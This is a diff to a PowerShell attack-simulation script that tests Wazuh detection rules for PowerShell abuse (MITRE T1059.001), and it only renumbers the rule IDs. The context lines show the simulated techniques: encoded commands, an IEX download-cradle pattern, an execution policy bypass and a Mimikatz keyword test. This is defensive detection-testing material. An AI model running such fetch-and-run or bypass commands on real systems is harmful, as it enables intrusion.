@@ -1,7 +1,7 @@
 #
 # PowerShell Attack Simulation
 # MITRE ATT&CK: T1059.001 - PowerShell
-# Tests Detection Rules: 100010, 100011, 100012, 100013, 100014
+# Tests Detection Rules: 200010, 200011, 200012, 200013, 200014
 #
 # ⚠️  WARNING: Only run in isolated lab environment!
 #
@@ -49,9 +49,9 @@ if ($confirm -ne "yes") {
 
 Write-Host "`n[+] Starting PowerShell attack simulation...`n" -ForegroundColor $GREEN
 
-# Test 1: Encoded PowerShell Command (Rule 100010)
+# Test 1: Encoded PowerShell Command (Rule 200010)
 Write-Test "1" "Encoded PowerShell Command Detection"
-Write-Host "Expected Detection: Rule 100010 (Encoded PowerShell command)"
+Write-Host "Expected Detection: Rule 200010 (Encoded PowerShell command)"
 
 try {
     # Create a benign encoded command
@@ -65,8 +65,8 @@ try {
     # Execute the encoded command
     powershell.exe -EncodedCommand $encodedCommand
     
-    Write-Host "✓ Encoded command executed (should trigger Rule 100010)" -ForegroundColor $GREEN
-    Log-Action "Rule 100010 should have triggered - Encoded PowerShell"
+    Write-Host "✓ Encoded command executed (should trigger Rule 200010)" -ForegroundColor $GREEN
+    Log-Action "Rule 200010 should have triggered - Encoded PowerShell"
 }
 catch {
     Write-Host "✗ Test failed: $_" -ForegroundColor $RED
@@ -74,9 +74,9 @@ catch {
 
 Start-Sleep -Seconds 2
 
-# Test 2: PowerShell Download Cradle (Rule 100011)
+# Test 2: PowerShell Download Cradle (Rule 200011)
 Write-Test "2" "PowerShell Download Cradle Detection"
-Write-Host "Expected Detection: Rule 100011 (Download cradle)"
+Write-Host "Expected Detection: Rule 200011 (Download cradle)"
 
 try {
     Write-Host "Simulating download cradle pattern..." -ForegroundColor $YELLOW
@@ -91,8 +91,8 @@ Write-Host "IEX (New-Object Net.WebClient).DownloadString('`$url')"
     Log-Action "Simulating download cradle pattern"
     Invoke-Expression $downloadCradle
     
-    Write-Host "✓ Download cradle pattern executed (should trigger Rule 100011)" -ForegroundColor $GREEN
-    Log-Action "Rule 100011 should have triggered - Download cradle"
+    Write-Host "✓ Download cradle pattern executed (should trigger Rule 200011)" -ForegroundColor $GREEN
+    Log-Action "Rule 200011 should have triggered - Download cradle"
 }
 catch {
     Write-Host "✗ Test failed: $_" -ForegroundColor $RED
@@ -100,9 +100,9 @@ catch {
 
 Start-Sleep -Seconds 2
 
-# Test 3: Execution Policy Bypass (Rule 100012)
+# Test 3: Execution Policy Bypass (Rule 200012)
 Write-Test "3" "Execution Policy Bypass Detection"
-Write-Host "Expected Detection: Rule 100012 (Execution policy bypass)"
+Write-Host "Expected Detection: Rule 200012 (Execution policy bypass)"
 
 try {
     Write-Host "Executing with execution policy bypass..." -ForegroundColor $YELLOW
@@ -119,8 +119,8 @@ try {
     # Cleanup
     Remove-Item $tempScript -Force
     
-    Write-Host "✓ Execution policy bypass used (should trigger Rule 100012)" -ForegroundColor $GREEN
-    Log-Action "Rule 100012 should have triggered - Execution policy bypass"
+    Write-Host "✓ Execution policy bypass used (should trigger Rule 200012)" -ForegroundColor $GREEN
+    Log-Action "Rule 200012 should have triggered - Execution policy bypass"
 }
 catch {
     Write-Host "✗ Test failed: $_" -ForegroundColor $RED
@@ -128,9 +128,9 @@ catch {
 
 Start-Sleep -Seconds 2
 
-# Test 4: Mimikatz Detection (Rule 100013)
+# Test 4: Mimikatz Detection (Rule 200013)
 Write-Test "4" "Mimikatz Keyword Detection"
-Write-Host "Expected Detection: Rule 100013 (Mimikatz detection)"
+Write-Host "Expected Detection: Rule 200013 (Mimikatz detection)"
 
 try {
     Write-Host "Simulating Mimikatz keyword usage..." -ForegroundColor $YELLOW
@@ -145,8 +145,8 @@ Write-Host "This should trigger the detection rule"
     Log-Action "Simulating Mimikatz keyword for detection"
     Invoke-Expression $mimikatzSimulation
     
-    Write-Host "✓ Mimikatz keyword detected (should trigger Rule 100013)" -ForegroundColor $GREEN
-    Log-Action "Rule 100013 should have triggered - Mimikatz detection"
+    Write-Host "✓ Mimikatz keyword detected (should trigger Rule 200013)" -ForegroundColor $GREEN
+    Log-Action "Rule 200013 should have triggered - Mimikatz detection"
 }
 catch {
     Write-Host "✗ Test failed: $_" -ForegroundColor $RED
@@ -154,9 +154,9 @@ catch {
 
 Start-Sleep -Seconds 2
 
-# Test 5: Invoke-Expression Detection (Rule 100014)
+# Test 5: Invoke-Expression Detection (Rule 200014)
 Write-Test "5" "Invoke-Expression Pattern Detection"
-Write-Host "Expected Detection: Rule 100014 (IEX usage)"
+Write-Host "Expected Detection: Rule 200014 (IEX usage)"
 
 try {
     Write-Host "Using Invoke-Expression (IEX)..." -ForegroundColor $YELLOW
@@ -170,8 +170,8 @@ try {
     # Also test IEX alias
     IEX "Write-Host 'Testing IEX alias'"
     
-    Write-Host "✓ Invoke-Expression used (should trigger Rule 100014)" -ForegroundColor $GREEN
-    Log-Action "Rule 100014 should have triggered - Invoke-Expression"
+    Write-Host "✓ Invoke-Expression used (should trigger Rule 200014)" -ForegroundColor $GREEN
+    Log-Action "Rule 200014 should have triggered - Invoke-Expression"
 }
 catch {
     Write-Host "✗ Test failed: $_" -ForegroundColor $RED
@@ -181,7 +181,7 @@ Start-Sleep -Seconds 2
 
 # Bonus Test: Multiple Techniques Combined
 Write-Test "BONUS" "Combined PowerShell Techniques"
-Write-Host "Expected Detection: Multiple rules (100010, 100014)"
+Write-Host "Expected Detection: Multiple rules (200010, 200014)"
 
 try {
     Write-Host "Combining encoded command with IEX..." -ForegroundColor $YELLOW
@@ -210,19 +210,19 @@ Write-Header "SIMULATION SUMMARY"
 Write-Host "`nSimulation Type: PowerShell Attack Techniques"
 Write-Host "MITRE ATT&CK: T1059.001 - PowerShell"
 Write-Host "`nTests Executed:"
-Write-Host "  1. Encoded Command (Rule 100010)"
-Write-Host "  2. Download Cradle (Rule 100011)"
-Write-Host "  3. Execution Policy Bypass (Rule 100012)"
-Write-Host "  4. Mimikatz Detection (Rule 100013)"
-Write-Host "  5. Invoke-Expression (Rule 100014)"
+Write-Host "  1. Encoded Command (Rule 200010)"
+Write-Host "  2. Download Cradle (Rule 200011)"
+Write-Host "  3. Execution Policy Bypass (Rule 200012)"
+Write-Host "  4. Mimikatz Detection (Rule 200013)"
+Write-Host "  5. Invoke-Expression (Rule 200014)"
 Write-Host "  BONUS. Combined Techniques"
 
 Write-Host "`nExpected Wazuh Alerts:" -ForegroundColor $GREEN
-Write-Host "  • Rule 100010: Encoded PowerShell command"
-Write-Host "  • Rule 100011: PowerShell download cradle"
-Write-Host "  • Rule 100012: Execution policy bypass"
-Write-Host "  • Rule 100013: Mimikatz detection"
-Write-Host "  • Rule 100014: Invoke-Expression usage"
+Write-Host "  • Rule 200010: Encoded PowerShell command"
+Write-Host "  • Rule 200011: PowerShell download cradle"
+Write-Host "  • Rule 200012: Execution policy bypass"
+Write-Host "  • Rule 200013: Mimikatz detection"
+Write-Host "  • Rule 200014: Invoke-Expression usage"
 
 Write-Host "`nVerification Steps:" -ForegroundColor $GREEN
 Write-Host "1. Check Wazuh dashboard for alerts"
@@ -262,7 +262,7 @@ if ($checkWazuh -eq "yes") {
     $wazuhServer = Read-Host "Enter Wazuh server address (e.g., ubuntu@10.0.1.100)"
     if ($wazuhServer) {
         Write-Host "`nConnecting to Wazuh server..." -ForegroundColor $YELLOW
-        ssh $wazuhServer "sudo tail -n 100 /var/ossec/logs/alerts/alerts.log | grep -A 5 'Rule: 10001'"
+        ssh $wazuhServer "sudo tail -n 100 /var/ossec/logs/alerts/alerts.log | grep -A 5 'Rule: 20001'"
     }
 }
 
